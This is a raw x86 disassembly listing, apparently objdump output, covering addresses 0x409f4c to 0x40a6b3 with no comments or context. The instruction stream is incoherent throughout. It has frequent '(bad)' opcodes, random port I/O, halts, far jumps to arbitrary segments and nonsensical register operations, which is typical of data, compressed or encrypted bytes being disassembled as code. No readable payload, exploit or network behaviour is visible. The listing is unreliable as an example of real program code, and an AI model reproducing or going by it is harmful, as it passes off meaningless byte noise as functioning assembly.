  409f4c:	mov    DWORD PTR [ebp+0x330ec2da],ebp
  409f52:	cwde   
  409f53:	mov    dh,0x8a
  409f55:	and    DWORD PTR [ebp+eax*8-0x80],esp
  409f59:	push   esp
  409f5a:	repnz inc ebp
  409f5c:	and    eax,0xa34d6e0f
  409f61:	mov    al,ds:0x9eee022c
  409f66:	jg     0x409f4e
  409f68:	(bad)  
  409f69:	fmul   st(6),st
  409f6b:	mov    edi,0xfcf9c297
  409f70:	ja     0x409f20
  409f72:	ficom  DWORD PTR [edi-0x60]
  409f75:	clc    
  409f76:	rcl    BYTE PTR ds:0xe5da2024,cl
  409f7c:	push   ebx
  409f7d:	rol    DWORD PTR [edi],1
  409f7f:	adc    bh,dh
  409f81:	cdq    
  409f82:	jae    0x409fad
  409f84:	pop    ss
  409f85:	sar    BYTE PTR [eax],0x82
  409f88:	inc    ebx
  409f89:	pop    esp
  409f8a:	enter  0x220e,0x49
  409f8e:	mov    bh,0xd7
  409f90:	pop    ebp
  409f91:	xor    DWORD PTR [ebx-0x18],0x47f785fe
  409f98:	sbb    al,0x5e
  409f9a:	xor    BYTE PTR [ebp-0x47dd7930],0x50
  409fa1:	test   al,0xff
  409fa3:	jns    0x40a00a
  409fa5:	and    eax,DWORD PTR [esp+esi*2-0x56550eb9]
  409fac:	mov    dl,0xc8
  409fae:	xor    bh,bl
  409fb0:	aaa    
  409fb1:	enter  0xfbfd,0xc7
  409fb5:	cdq    
  409fb6:	imul   edi,DWORD PTR [edi],0xffffffdb
  409fb9:	adc    dh,0x3f
  409fbc:	fild   QWORD PTR [esi-0x16]
  409fbf:	pop    ecx
  409fc0:	mov    ds:0x8980f8fe,eax
  409fc5:	aas    
  409fc6:	arpl   WORD PTR [edx+0x24],bx
  409fc9:	or     ah,BYTE PTR ds:0x725f
  409fce:	stos   DWORD PTR es:[edi],eax
  409fcf:	or     BYTE PTR [eax+0x32],0x87
  409fd3:	leave  
  409fd4:	in     al,0xd
  409fd6:	shl    BYTE PTR [esi],cl
  409fd8:	xor    al,0x8e
  409fda:	push   0x447e7eb0
  409fdf:	adc    eax,0x81d66a33
  409fe4:	xor    dl,cl
  409fe6:	cli    
  409fe7:	outs   dx,BYTE PTR ds:[esi]
  409fe8:	(bad)  
  409fe9:	loop   0x409f86
  409feb:	push   edi
  409fec:	sub    cl,BYTE PTR [eax]
  409fee:	rcl    bh,1
  409ff0:	inc    edx
  409ff1:	push   0x989a2c89
  409ff6:	fs sbb eax,0x2b23ca59
  409ffc:	test   al,0xf3
  409ffe:	inc    ebp
  409fff:	(bad)  
  40a000:	pop    ds
  40a001:	xchg   esp,eax
  40a002:	mov    esi,0x74e43ac3
  40a007:	sbb    BYTE PTR [ebx+0x7cd7d74f],0x1c
  40a00e:	inc    ebp
  40a00f:	mov    DWORD PTR [edi+0x21],0x6c4158c0
  40a016:	iret   
  40a017:	jp     0x409fc9
  40a019:	stos   DWORD PTR es:[edi],eax
  40a01a:	aas    
  40a01b:	add    ebp,esp
  40a01d:	(bad)  
  40a01e:	and    ah,dl
  40a020:	and    dl,BYTE PTR [ebp-0x33]
  40a023:	sti    
  40a024:	xor    ah,BYTE PTR [eax+0x6d]
  40a027:	nop
  40a028:	xor    cl,ah
  40a02a:	xchg   edx,eax
  40a02b:	and    ebx,DWORD PTR [edx-0x80]
  40a02e:	sbb    eax,0x227f226e
  40a033:	cmp    bl,al
  40a035:	not    BYTE PTR [esi]
  40a037:	fsubr  QWORD PTR [esi+0x52]
  40a03a:	or     al,0xd
  40a03c:	dec    esp
  40a03d:	sbb    DWORD PTR [eax+0x56],ebx
  40a040:	xor    DWORD PTR [ecx+ebp*2],ecx
  40a043:	nop
  40a044:	aad    0xde
  40a046:	xor    ch,bh
  40a048:	pop    es
  40a049:	xor    DWORD PTR es:[ecx],ebp
  40a04c:	mov    DWORD PTR [ebx-0x76fc3714],eax
  40a052:	lods   eax,DWORD PTR ds:[esi]
  40a053:	mov    ecx,0xf2fe2636
  40a058:	iret   
  40a059:	mov    ds:0x672e4778,al
  40a05e:	mov    cl,0x97
  40a060:	push   ebp
  40a061:	sub    eax,DWORD PTR [edx-0x313276ec]
  40a067:	pop    eax
  40a068:	sub    ecx,DWORD PTR [edx+edi*2+0x4c]
  40a06c:	rcl    DWORD PTR [ebp+0x40beb012],1
  40a072:	dec    esi
  40a073:	cmp    ah,dh
  40a075:	aaa    
  40a076:	das    
  40a077:	pop    ss
  40a078:	cwde   
  40a079:	xor    al,0xa2
  40a07b:	aad    0xda
  40a07d:	mov    DWORD PTR [edi+ebp*1],ebp
  40a080:	shr    DWORD PTR [edx],cl
  40a082:	cmp    BYTE PTR [edx+0xc],cl
  40a085:	rcl    BYTE PTR [edx],0x21
  40a088:	push   0x52
  40a08a:	call   0xd7786fb8
  40a08f:	test   DWORD PTR [eax+0x6920ae3d],ebp
  40a095:	jo     0x40a070
  40a097:	out    dx,eax
  40a098:	enter  0xb3b5,0x35
  40a09c:	mov    edx,0xcc9dd424
  40a0a1:	xchg   ebp,edi
  40a0a3:	(bad)  
  40a0a4:	jne    0x40a11b
  40a0a6:	arpl   bp,di
  40a0a8:	test   eax,0x74585974
  40a0ad:	and    eax,0x4e8b6380
  40a0b2:	loopne 0x40a0d0
  40a0b4:	jbe    0x40a0ee
  40a0b6:	ja     0x40a0c5
  40a0b8:	fisub  DWORD PTR [esi-0x5d31bdeb]
  40a0be:	inc    ebx
  40a0bf:	and    BYTE PTR [edx],ah
  40a0c1:	fs mov ch,ah
  40a0c4:	push   esp
  40a0c5:	cmp    DWORD PTR [ebx],esp
  40a0c7:	adc    ch,BYTE PTR ds:0x996a5a45
  40a0cd:	cmp    DWORD PTR [edi],eax
  40a0cf:	fnstsw WORD PTR [eax+edx*1-0x4f2070a2]
  40a0d6:	stos   DWORD PTR es:[edi],eax
  40a0d7:	clc    
  40a0d8:	out    0x4a,eax
  40a0da:	mov    bh,0xd2
  40a0dc:	sub    BYTE PTR [edx],cl
  40a0de:	jo     0x40a0b9
  40a0e0:	push   edi
  40a0e1:	xor    eax,0x378b9bad
  40a0e6:	(bad)  [esi+eax*4-0x59386dfb]
  40a0ed:	cwde   
  40a0ee:	xchg   edx,eax
  40a0ef:	add    al,0x7c
  40a0f1:	cdq    
  40a0f2:	das    
  40a0f3:	out    dx,al
  40a0f4:	add    dh,bl
  40a0f6:	lods   al,BYTE PTR ds:[esi]
  40a0f7:	int    0xf8
  40a0f9:	xchg   ebp,eax
  40a0fa:	add    eax,0x166d5c5a
  40a0ff:	in     al,dx
  40a100:	jb     0x40a164
  40a102:	mov    ebp,DWORD PTR ds:0xad94e7b6
  40a108:	mov    ebp,0x8047c9d0
  40a10d:	cmp    BYTE PTR [eax-0x2],0xa2
  40a111:	out    dx,eax
  40a112:	cmp    DWORD PTR [eax+0x6],edi
  40a115:	ror    DWORD PTR [ebp+0x3c],1
  40a118:	popf   
  40a119:	dec    ecx
  40a11a:	xchg   ecx,eax
  40a11b:	lea    edx,[eax]
  40a11d:	push   0x1a
  40a11f:	ja     0x40a171
  40a121:	mov    DWORD PTR [edi+eiz*1-0x40151abc],ebp
  40a128:	push   ss
  40a129:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a12a:	out    0x7e,al
  40a12c:	ss test bl,0xd4
  40a130:	jp     0x40a198
  40a132:	(bad)  
  40a133:	addr16 xchg esi,eax
  40a135:	cmp    eax,0xabd2f9f9
  40a13a:	(bad)  
  40a13b:	fimul  WORD PTR [ebx+0x45cb0584]
  40a141:	and    cl,BYTE PTR [edi-0x620890b5]
  40a147:	cmc    
  40a148:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a149:	mov    ecx,0x334b7369
  40a14e:	mov    al,ds:0xec4d5ecd
  40a153:	fwait
  40a154:	mov    edi,0x40f6a047
  40a159:	sbb    eax,0x76e6bff4
  40a15e:	scas   eax,DWORD PTR es:[edi]
  40a15f:	pop    es
  40a160:	cmp    edi,DWORD PTR [edx]
  40a162:	not    DWORD PTR [edx]
  40a164:	mov    esp,0x846f318
  40a169:	popf   
  40a16a:	sahf   
  40a16b:	aas    
  40a16c:	fptan  
  40a16e:	sbb    edi,0xffffffb3
  40a171:	jecxz  0x40a0f5
  40a173:	add    al,BYTE PTR [ecx]
  40a175:	loopne 0x40a10c
  40a177:	add    BYTE PTR [edi],cl
  40a179:	pop    ebp
  40a17a:	cmp    ebp,edi
  40a17c:	pop    esp
  40a17d:	cmp    cl,BYTE PTR [ecx]
  40a17f:	(bad)  
  40a180:	mov    ds:0x52522e3c,al
  40a185:	(bad)  [eax]
  40a187:	shl    eax,0x4a
  40a18a:	addr16 mov bl,0x30
  40a18d:	out    0x65,eax
  40a18f:	pop    es
  40a190:	int    0xbb
  40a192:	cmp    bl,BYTE PTR [edi+esi*8]
  40a195:	retf   
  40a196:	imul   esp,DWORD PTR [ecx+0x27],0xffffff86
  40a19a:	sar    DWORD PTR [ebx-0x40],0x56
  40a19e:	fidiv  DWORD PTR [esi-0x9]
  40a1a1:	ds push esp
  40a1a3:	sub    BYTE PTR [ecx*1-0x46a85684],cl
  40a1aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1ab:	mov    edi,0x44837cc
  40a1b0:	jb     0x40a193
  40a1b2:	shl    DWORD PTR [ebx+ebx*8],0x8
  40a1b6:	test   BYTE PTR [edx+0x2f],dl
  40a1b9:	leave  
  40a1ba:	sbb    BYTE PTR [eax-0x1e],0x61
  40a1be:	ins    DWORD PTR es:[edi],dx
  40a1bf:	out    0x68,eax
  40a1c1:	or     bl,BYTE PTR [edx]
  40a1c3:	add    BYTE PTR [ebx],ch
  40a1c5:	add    cl,BYTE PTR [eax-0x3c2dde01]
  40a1cb:	cld    
  40a1cc:	mov    BYTE PTR [edi+esi*4+0x2],0x79
  40a1d1:	lock out dx,eax
  40a1d3:	pop    esi
  40a1d4:	add    ebx,DWORD PTR [ebx+esi*8-0x25]
  40a1d8:	xor    ebp,ecx
  40a1da:	dec    BYTE PTR [edx+ebx*4+0x26d69c19]
  40a1e1:	cmp    esp,DWORD PTR [ebx-0x623f74af]
  40a1e7:	clc    
  40a1e8:	jmp    0x38a7:0x35d4c063
  40a1ef:	sbb    dh,BYTE PTR [esi+0x7a]
  40a1f2:	mov    ss,WORD PTR [edx-0x660fdad7]
  40a1f8:	xchg   ebp,eax
  40a1f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1fa:	mov    ds:0x13ac1729,eax
  40a1ff:	or     al,BYTE PTR [ecx+0x28154fd7]
  40a205:	repz ds shr ah,0xaf
  40a20a:	ss retf 0x4799
  40a20e:	(bad)  
  40a210:	xchg   edi,eax
  40a211:	pop    ss
  40a212:	mov    eax,ds:0x6175f9d3
  40a217:	fsubr  st(7),st
  40a219:	dec    esi
  40a21a:	out    0xbe,al
  40a21c:	mov    DWORD PTR [esi-0x49],eax
  40a21f:	pusha  
  40a220:	fcomi  st,st(6)
  40a222:	fdivr  QWORD PTR [eax]
  40a224:	add    eax,0xaaf225af
  40a229:	cmp    dl,bh
  40a22b:	bound  edx,QWORD PTR [esi]
  40a22d:	push   ecx
  40a22e:	cdq    
  40a22f:	mov    dh,0xfe
  40a231:	dec    esp
  40a232:	pop    ebp
  40a233:	pop    esi
  40a234:	daa    
  40a235:	pop    ecx
  40a236:	adc    BYTE PTR [esi-0x1246cd9],cl
  40a23c:	jecxz  0x40a1da
  40a23e:	cmc    
  40a23f:	mov    WORD PTR [edi+0x414e74aa],gs
  40a245:	push   esp
  40a246:	out    dx,al
  40a247:	cmp    DWORD PTR [edi+0x4b],edi
  40a24a:	cli    
  40a24b:	xchg   esp,eax
  40a24c:	pop    ecx
  40a24d:	sub    al,BYTE PTR [eax+0x1e04bb1]
  40a253:	xchg   edi,eax
  40a254:	ror    edi,0x6e
  40a257:	out    0xfc,al
  40a259:	inc    eax
  40a25a:	mov    WORD PTR [ecx+0x6a],ss
  40a25d:	mov    ch,0x92
  40a25f:	fwait
  40a260:	outs   dx,BYTE PTR ds:[esi]
  40a261:	scas   eax,DWORD PTR es:[edi]
  40a262:	sti    
  40a263:	mov    eax,ds:0x59fb9d6f
  40a268:	adc    al,0x57
  40a26a:	out    dx,al
  40a26b:	mov    dl,0x69
  40a26d:	enter  0x10b2,0xa3
  40a271:	loope  0x40a1fc
  40a273:	jo     0x40a23b
  40a275:	adc    DWORD PTR [esi],ebp
  40a277:	and    bl,BYTE PTR [eax-0x7566e60c]
  40a27d:	clc    
  40a27e:	mov    al,ds:0x32c4108b
  40a283:	push   esi
  40a284:	stos   BYTE PTR es:[edi],al
  40a285:	and    al,0xc6
  40a287:	ins    BYTE PTR es:[edi],dx
  40a288:	and    eax,0xc0dc0e5a
  40a28d:	push   0x69
  40a28f:	scas   eax,DWORD PTR es:[edi]
  40a290:	mov    eax,ds:0x59f6c804
  40a295:	aad    0xab
  40a297:	loopne 0x40a279
  40a299:	clc    
  40a29a:	ds mov dh,0xd8
  40a29d:	retf   
  40a29e:	pop    eax
  40a29f:	cdq    
  40a2a0:	sub    al,0x57
  40a2a2:	inc    edx
  40a2a3:	dec    eax
  40a2a4:	scas   al,BYTE PTR es:[edi]
  40a2a5:	jge    0x40a320
  40a2a7:	inc    ecx
  40a2a8:	paddusb mm0,QWORD PTR [ebx+0x77]
  40a2ac:	mov    bh,0x14
  40a2ae:	and    edx,DWORD PTR [eax-0x43]
  40a2b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2b2:	push   es
  40a2b3:	mov    ebp,0x2e19ff2d
  40a2b8:	aas    
  40a2b9:	mov    dh,0xf
  40a2bb:	sbb    eax,0x2c94cc7e
  40a2c0:	jp     0x40a289
  40a2c2:	jg     0x40a2ac
  40a2c4:	cdq    
  40a2c5:	ins    BYTE PTR es:[edi],dx
  40a2c6:	pop    edi
  40a2c7:	outs   dx,BYTE PTR ds:[esi]
  40a2c8:	jecxz  0x40a2b0
  40a2ca:	add    eax,0xef213468
  40a2cf:	mov    ds:0x3d7e5519,eax
  40a2d4:	dec    esp
  40a2d5:	cld    
  40a2d6:	jo     0x40a34a
  40a2d8:	dec    ecx
  40a2d9:	leave  
  40a2da:	mov    edx,0x20f8536e
  40a2df:	or     cl,BYTE PTR [esi-0x38e433c8]
  40a2e5:	jle    0x40a2ec
  40a2e7:	popa   
  40a2e8:	dec    edi
  40a2e9:	in     al,0x98
  40a2eb:	loopne 0x40a314
  40a2ed:	rol    BYTE PTR [ebx+0x7a6717d5],1
  40a2f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2f4:	repnz out 0xa9,al
  40a2f7:	(bad)  
  40a2f8:	iret   
  40a2f9:	ret    0xd52a
  40a2fc:	sub    DWORD PTR [edx+0x49],0xdc0a755c
  40a303:	std    
  40a304:	fs aaa 
  40a306:	inc    edi
  40a307:	stos   DWORD PTR es:[edi],eax
  40a308:	dec    esp
  40a309:	in     al,0x7a
  40a30b:	sub    ch,bl
  40a30d:	mov    es,WORD PTR [ecx]
  40a30f:	leave  
  40a310:	mov    WORD PTR [esi-0x47f739a7],?
  40a316:	add    DWORD PTR [ebp+0x2ec87e14],edx
  40a31c:	add    ecx,edx
  40a31e:	addr16 fcomi st,st(7)
  40a321:	inc    edi
  40a322:	xor    DWORD PTR [ebx],esi
  40a324:	pop    ss
  40a325:	xchg   ecx,eax
  40a326:	iret   
  40a327:	or     ebx,DWORD PTR ds:0xbf3fd48a
  40a32d:	and    DWORD PTR [eax+0x390732fd],esp
  40a333:	mov    esi,0xf8ae34e
  40a338:	pop    ds
  40a339:	int3   
  40a33a:	popa   
  40a33b:	loope  0x40a37e
  40a33d:	pop    ds
  40a33e:	outs   dx,BYTE PTR ds:[esi]
  40a33f:	fucomip st,st(4)
  40a341:	jo     0x40a386
  40a343:	sub    al,0x25
  40a345:	js     0x40a2d0
  40a347:	xor    ebp,DWORD PTR [ecx]
  40a349:	jmp    0x40a348
  40a34b:	push   edx
  40a34c:	sub    eax,0xc3e393bf
  40a351:	xchg   BYTE PTR [eax],dh
  40a353:	sbb    cl,bh
  40a355:	test   al,0xd9
  40a357:	jb     0x40a338
  40a359:	ror    cl,cl
  40a35b:	jae    0x40a32f
  40a35d:	inc    ebp
  40a35e:	fcomi  st,st(5)
  40a360:	jl     0x40a330
  40a362:	dec    ecx
  40a363:	push   es
  40a364:	cs loop 0x40a3c1
  40a367:	xchg   edx,eax
  40a368:	xchg   esi,eax
  40a369:	push   edi
  40a36a:	and    eax,0x5d29ba68
  40a36f:	pop    ebx
  40a370:	xor    DWORD PTR [ecx-0x181594fc],esp
  40a376:	mov    edx,0x2a3fa600
  40a37b:	and    esp,0xd4d4944
  40a381:	and    eax,0xae9d7b37
  40a386:	ja     0x40a36e
  40a388:	sbb    dh,dh
  40a38a:	dec    edi
  40a38b:	iret   
  40a38c:	mov    eax,ds:0x86b3a77e
  40a391:	xchg   esi,eax
  40a392:	ins    DWORD PTR es:[edi],dx
  40a393:	adc    ch,BYTE PTR [esi+0x17]
  40a396:	inc    edi
  40a397:	adc    BYTE PTR [eax-0xf],ah
  40a39a:	scas   al,BYTE PTR es:[edi]
  40a39b:	inc    esp
  40a39c:	push   eax
  40a39d:	test   DWORD PTR [eax+0x3c9cdf2e],edi
  40a3a3:	(bad)  
  40a3a4:	std    
  40a3a5:	retf   0xc0c6
  40a3a8:	inc    ebp
  40a3a9:	in     al,0x41
  40a3ab:	ror    BYTE PTR [edi],cl
  40a3ad:	scas   eax,DWORD PTR es:[edi]
  40a3ae:	jns    0x40a3fc
  40a3b0:	hlt    
  40a3b1:	(bad)  
  40a3b2:	jne    0x40a38f
  40a3b4:	fwait
  40a3b5:	inc    esi
  40a3b6:	ja     0x40a3fa
  40a3b8:	xchg   edx,eax
  40a3b9:	mov    gs,eax
  40a3bb:	sti    
  40a3bc:	int3   
  40a3bd:	test   al,0xb0
  40a3bf:	mov    ?,WORD PTR [esi-0x15]
  40a3c2:	hlt    
  40a3c3:	loop   0x40a3a0
  40a3c5:	jg     0x40a437
  40a3c7:	xchg   edi,eax
  40a3c8:	das    
  40a3c9:	out    dx,eax
  40a3ca:	add    DWORD PTR [ebx+0x46],eax
  40a3cd:	push   0xeab2b186
  40a3d2:	dec    eax
  40a3d3:	mov    cl,0xea
  40a3d5:	adc    DWORD PTR [ebp+0x3392a4ce],esp
  40a3db:	xchg   ebx,eax
  40a3dc:	pop    edx
  40a3dd:	sub    eax,0x68134c91
  40a3e2:	bound  ecx,QWORD PTR [ecx]
  40a3e4:	and    edi,DWORD PTR [edx]
  40a3e6:	or     esp,edi
  40a3e8:	dec    edx
  40a3e9:	test   BYTE PTR fs:[ebx+eiz*8],bh
  40a3ed:	mov    ds,WORD PTR [eax]
  40a3ef:	outs   dx,BYTE PTR ds:[esi]
  40a3f0:	mov    dh,0xb2
  40a3f2:	xchg   edi,eax
  40a3f3:	xchg   edi,eax
  40a3f4:	inc    ebp
  40a3f5:	lea    edi,[eax+0xdcb088c]
  40a3fb:	arpl   cx,sp
  40a3fd:	aas    
  40a3fe:	fs hlt 
  40a400:	mov    eax,ds:0x46d0af35
  40a405:	xor    al,0xf1
  40a407:	cwde   
  40a408:	mov    DWORD PTR [edx],edx
  40a40a:	jnp    0x40a3b8
  40a40c:	mov    ebx,0xa8ae990
  40a411:	mov    dh,BYTE PTR ds:0xe787a3f4
  40a417:	aam    0xed
  40a419:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a41a:	(bad)  
  40a41b:	out    dx,al
  40a41c:	push   ss
  40a41d:	out    0x61,eax
  40a41f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a420:	popa   
  40a421:	push   ss
  40a422:	dec    DWORD PTR [eax-0x6463bb5a]
  40a428:	push   ebp
  40a429:	aas    
  40a42a:	fild   QWORD PTR [ecx]
  40a42c:	ror    DWORD PTR [ecx-0x2d74367],cl
  40a432:	cmc    
  40a433:	xchg   esp,eax
  40a434:	xchg   ecx,eax
  40a435:	mov    al,0x80
  40a437:	xchg   ecx,eax
  40a438:	add    ch,BYTE PTR [ebx]
  40a43a:	dec    eax
  40a43b:	sub    BYTE PTR [eax],dl
  40a43d:	or     ecx,edx
  40a43f:	sbb    DWORD PTR [edi-0x63c4ab6c],esi
  40a445:	or     DWORD PTR [edx-0x65],ebp
  40a448:	push   0xffffffed
  40a44a:	mov    esp,0x950dc44d
  40a44f:	pop    edi
  40a450:	sbb    esi,DWORD PTR [edx+0x4d]
  40a453:	ins    DWORD PTR es:[edi],dx
  40a454:	mov    ebx,ebx
  40a456:	repnz cli 
  40a458:	xlat   BYTE PTR ds:[ebx]
  40a459:	outs   dx,DWORD PTR ds:[esi]
  40a45a:	imul   esp,ebx,0x2d
  40a45d:	lea    ecx,[ebx-0x5ad93e69]
  40a463:	xchg   esp,eax
  40a464:	cs dec edi
  40a466:	push   ecx
  40a467:	adc    BYTE PTR [ebx-0x2f],al
  40a46a:	(bad)  [ebx]
  40a46c:	dec    ebx
  40a46d:	ret    
  40a46e:	mov    ebx,0x5c829f72
  40a473:	push   ss
  40a474:	mov    dh,0x69
  40a476:	sar    BYTE PTR [ebx+0x1d34ec31],1
  40a47c:	test   eax,0x3d86d818
  40a481:	mov    al,0xf9
  40a483:	push   0x55
  40a485:	jecxz  0x40a495
  40a487:	dec    edi
  40a488:	cld    
  40a489:	or     al,0xd5
  40a48b:	jl     0x40a4e4
  40a48d:	dec    esi
  40a48e:	mov    cl,0x83
  40a490:	mov    eax,ds:0x6e8cbfb7
  40a495:	cmp    eax,0x88051cbe
  40a49a:	and    ecx,DWORD PTR [edx+0x2b6e43f]
  40a4a0:	(bad)  
  40a4a1:	push   eax
  40a4a2:	pusha  
  40a4a3:	fisubr DWORD PTR [ebp-0x1f25c263]
  40a4a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a4aa:	pusha  
  40a4ab:	imul   edx,DWORD PTR [edx+0xd],0x91ebf8a8
  40a4b2:	mov    dh,0x60
  40a4b4:	mov    BYTE PTR [esi-0x4c],dh
  40a4b7:	xor    eax,0xea0e5ad7
  40a4bc:	out    0x12,al
  40a4be:	adc    esi,edx
  40a4c0:	push   edx
  40a4c1:	outs   dx,DWORD PTR ds:[esi]
  40a4c2:	adc    eax,0x35174546
  40a4c7:	rol    ch,1
  40a4c9:	jg     0x40a467
  40a4cb:	push   cs
  40a4cc:	xor    ebp,eax
  40a4ce:	cld    
  40a4cf:	retf   
  40a4d0:	retf   
  40a4d1:	js     0x40a510
  40a4d3:	popa   
  40a4d4:	push   esp
  40a4d5:	mov    ds:0x55d7f5f,eax
  40a4da:	sub    eax,0x872a2b1b
  40a4df:	pop    ebx
  40a4e0:	lods   al,BYTE PTR ds:[esi]
  40a4e1:	clc    
  40a4e2:	fld    QWORD PTR [esi+0x24]
  40a4e5:	xor    bl,ch
  40a4e7:	stos   DWORD PTR es:[edi],eax
  40a4e8:	dec    DWORD PTR [ecx-0x76]
  40a4eb:	adc    bh,bh
  40a4ed:	jo     0x40a533
  40a4ef:	jno    0x40a4cb
  40a4f1:	ja     0x40a493
  40a4f3:	int    0x3d
  40a4f5:	pop    ebx
  40a4f6:	and    al,0xd2
  40a4f8:	(bad)  
  40a4fa:	or     bh,bl
  40a4fc:	icebp  
  40a4fd:	xchg   ebx,eax
  40a4fe:	popa   
  40a4ff:	ds pop esi
  40a501:	push   DWORD PTR [esi]
  40a503:	gs aad 0x3e
  40a506:	add    eax,0xd024b50d
  40a50b:	jnp    0x40a500
  40a50d:	add    eax,ebp
  40a50f:	rcl    BYTE PTR [edi-0x56],cl
  40a512:	cdq    
  40a513:	call   0x8c02:0x74798e63
  40a51a:	imul   esi,DWORD PTR [edi+0x37d3c697],0xffffff90
  40a521:	js     0x40a591
  40a523:	sbb    DWORD PTR [edi],0xd310ea29
  40a529:	cmp    DWORD PTR [esi+0x1860d8c7],ebp
  40a52f:	pop    ecx
  40a530:	xor    DWORD PTR [edx-0x6305e379],ecx
  40a536:	or     BYTE PTR [ecx+edi*1-0x19064b1a],bl
  40a53d:	call   0x8b3b:0xda1dbef7
  40a544:	outs   dx,DWORD PTR ds:[esi]
  40a545:	loope  0x40a557
  40a547:	aas    
  40a548:	adc    esi,edx
  40a54a:	bound  eax,QWORD PTR [eax+edi*8]
  40a54d:	dec    edx
  40a54e:	or     BYTE PTR ds:0x734f70eb,al
  40a554:	pop    edi
  40a555:	jg     0x40a50b
  40a557:	enter  0x18d6,0xc3
  40a55b:	mov    bl,0x9f
  40a55d:	pop    es
  40a55e:	pop    ebx
  40a55f:	bound  esi,QWORD PTR [edx+0x22fb293a]
  40a565:	jmp    0xc29e9a91
  40a56a:	sub    eax,0x36c04186
  40a56f:	xchg   ebx,eax
  40a570:	xchg   edi,eax
  40a571:	aas    
  40a572:	and    dl,dl
  40a574:	inc    edi
  40a575:	sar    ch,1
  40a577:	js     0x40a558
  40a579:	cld    
  40a57a:	xor    eax,0x553e2866
  40a57f:	jg     0x40a54d
  40a581:	repz push esp
  40a583:	daa    
  40a584:	xor    BYTE PTR [ecx],bl
  40a586:	add    eax,0x271e9de3
  40a58b:	mov    ecx,0x7009c4a3
  40a590:	xchg   esp,eax
  40a591:	xor    ebx,0x9b857f18
  40a597:	or     DWORD PTR ds:0x5e568dc4,edi
  40a59d:	sub    al,0xb6
  40a59f:	out    dx,eax
  40a5a0:	fild   WORD PTR [esi-0x78d43fef]
  40a5a6:	ja     0x40a599
  40a5a8:	(bad)  
  40a5a9:	cli    
  40a5aa:	ds aad 0x11
  40a5ad:	add    al,0x8b
  40a5af:	std    
  40a5b0:	in     eax,dx
  40a5b1:	(bad)  
  40a5b2:	or     al,0x61
  40a5b4:	popf   
  40a5b5:	add    eax,0x5b62d17a
  40a5ba:	adc    al,0xbf
  40a5bc:	test   BYTE PTR [edx-0x7d],al
  40a5bf:	jp     0x40a61a
  40a5c1:	mov    WORD PTR [ecx-0x179bf5c5],gs
  40a5c7:	push   esi
  40a5c8:	lods   eax,DWORD PTR ds:[esi]
  40a5c9:	or     BYTE PTR [esi+0x6c],ch
  40a5cc:	xchg   edi,eax
  40a5cd:	cld    
  40a5ce:	push   eax
  40a5cf:	in     eax,0x68
  40a5d1:	mov    edi,DWORD PTR ds:0x39713b05
  40a5d7:	test   eax,0x82ed705f
  40a5dc:	lds    esp,FWORD PTR [edi-0x55]
  40a5df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5e0:	adc    BYTE PTR [edi-0x515e7e8d],al
  40a5e6:	les    ebx,FWORD PTR [edx]
  40a5e8:	jmp    0x40a5e1
  40a5ea:	jbe    0x40a634
  40a5ec:	les    esp,FWORD PTR [edx-0xa]
  40a5ef:	cmp    al,BYTE PTR [ebx+edi*4-0x2d]
  40a5f3:	push   ecx
  40a5f4:	mov    eax,0x20df8bc4
  40a5f9:	int3   
  40a5fa:	dec    edx
  40a5fb:	test   esi,eax
  40a5fd:	test   BYTE PTR [ebx-0x68efeb1f],bh
  40a603:	ins    BYTE PTR es:[edi],dx
  40a604:	rol    DWORD PTR [ebp-0x1d6be740],0x98
  40a60b:	out    0xd0,al
  40a60d:	shl    DWORD PTR [ebx],0x3
  40a610:	call   0x3fdf0dc1
  40a615:	inc    esi
  40a616:	add    eax,0x5b4ab7a0
  40a61b:	and    dh,ch
  40a61d:	jge    0x40a5b4
  40a61f:	or     DWORD PTR [edi-0x377140bb],esi
  40a625:	ss daa 
  40a627:	(bad)
  40a62b:	ja     0x40a5e4
  40a62d:	aas    
  40a62e:	sub    al,0xdd
  40a630:	mov    eax,ds:0x9a61ab6a
  40a636:	mov    BYTE PTR ds:[esi-0x1470189c],dh
  40a63d:	push   eax
  40a63e:	dec    edx
  40a63f:	sti    
  40a640:	jno    0x40a61d
  40a642:	test   al,0x71
  40a644:	xchg   ecx,eax
  40a645:	push   esi
  40a646:	fnstenv [edx+0x1458cca7]
  40a64c:	out    0x59,eax
  40a64e:	dec    edx
  40a64f:	cs das 
  40a651:	outs   dx,DWORD PTR ds:[esi]
  40a652:	or     ecx,eax
  40a654:	lahf   
  40a655:	rcr    edi,1
  40a657:	jne    0x40a66f
  40a659:	inc    esi
  40a65a:	cdq    
  40a65b:	dec    ecx
  40a65c:	int    0x26
  40a65e:	into   
  40a65f:	jl     0x40a602
  40a661:	xor    edx,DWORD PTR [ebp-0x11]
  40a664:	out    dx,eax
  40a665:	popa   
  40a666:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a667:	retf   
  40a668:	mov    ds:0xcde07af,eax
  40a66d:	mov    BYTE PTR cs:[edi+0x7a],ch
  40a671:	in     eax,0xa4
  40a673:	xchg   ebp,eax
  40a674:	dec    esi
  40a675:	jnp    0x40a634
  40a677:	mov    WORD PTR [edi-0x1b],es
  40a67a:	addr16 jle 0x40a6e8
  40a67d:	fwait
  40a67e:	stc    
  40a67f:	mov    cl,0xb8
  40a681:	into   
  40a682:	inc    esi
  40a683:	adc    DWORD PTR [edi+0x703621c5],0x2767ba1e
  40a68d:	jbe    0x40a6e3
  40a68f:	inc    eax
  40a690:	mov    BYTE PTR [eax-0x5c4b8a33],al
  40a696:	lods   al,BYTE PTR ds:[esi]
  40a697:	nop
  40a698:	and    al,bl
  40a69a:	or     DWORD PTR fs:[esi+0x3d6a3602],esi
  40a6a1:	dec    eax
  40a6a2:	hlt    
  40a6a3:	push   ebp
  40a6a4:	mov    ebx,0xb1395f96
  40a6a9:	dec    eax
  40a6aa:	(bad)  
  40a6ab:	call   DWORD PTR [ecx]
  40a6ad:	and    DWORD PTR [eax+0x40a421ff],ebp
  40a6b3:	imul   edi,DWORD PTR [ebp-0xd],0xffffffd3
